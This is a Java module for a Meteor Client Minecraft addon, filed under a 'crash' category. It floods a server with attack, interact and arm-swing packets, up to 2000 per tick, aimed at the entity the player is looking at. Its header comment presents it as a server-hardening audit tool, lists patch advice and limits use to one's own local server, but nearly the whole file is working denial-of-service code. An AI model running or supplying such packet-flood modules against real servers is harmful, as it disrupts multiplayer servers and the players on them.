package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.EntityHitResult;

/**
 * AUDIT: Entity Interaction Spam
 *
 * Spams attack and interact packets on the entity in the crosshair at a
 * configurable rate. Every interaction forces a server-side entity lookup,
 * permission check, combat-cooldown validation, and AC check. At high rates
 * this saturates the entity interaction pipeline and tests whether the server
 * rate-limits attack packets per-player before doing the expensive work.
 *
 * RAPID_SWING mode additionally floods arm-swing packets which trigger entity
 * animation rebroadcast to all viewers — cheap to send, O(viewers) to rebroadcast.
 *
 * Patch signal: bound per-player entity interaction rate at the packet handler
 * entry point; enforce attack cooldown server-side before touching any combat
 * state; rate-limit arm-swing rebroadcast per player per tick.
 *
 * Look at an entity, enable. Run against your OWN local server only.
 */
public class EntitySpam extends Module {
    public enum Mode { REAL_ONLY, RAPID_SWING, BOTH }

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode")
        .description("REAL_ONLY = attack/interact the crosshair entity. RAPID_SWING = arm-swing flood. BOTH = all.")
        .defaultValue(Mode.BOTH).build()
    );
    private final Setting<Integer> perTick = sgGeneral.add(new IntSetting.Builder()
        .name("per-tick").description("Interaction packets per tick.")
        .defaultValue(100).range(1, 2000).sliderRange(1, 500).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    public EntitySpam() {
        super(AddonTemplate.CRASH_CATEGORY, "entity-spam",
            "Spams attack/interact + arm-swing packets on the crosshair entity. Tests entity interaction rate-limiting and combat cooldown enforcement.");
    }

    @Override
    public void onActivate() { ticksActive = 0; packetsSent = 0; }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        ticksActive++;
        Entity real = (mc.crosshairTarget instanceof EntityHitResult ehr) ? ehr.getEntity() : null;

        if (real == null && mode.get() == Mode.REAL_ONLY) {
            warning("Look at an entity.");
            return;
        }

        for (int i = 0; i < perTick.get(); i++) {
            if (mode.get() != Mode.RAPID_SWING && real != null) {
                mc.player.networkHandler.sendPacket(
                    PlayerInteractEntityC2SPacket.attack(real, mc.player.isSneaking()));
            packetsSent++;
                mc.player.networkHandler.sendPacket(
                    PlayerInteractEntityC2SPacket.interact(real, mc.player.isSneaking(), Hand.MAIN_HAND));
            packetsSent++;
            }
            if (mode.get() != Mode.REAL_ONLY) {
                mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            packetsSent++;
                mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.OFF_HAND));
            packetsSent++;
            }
        }
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
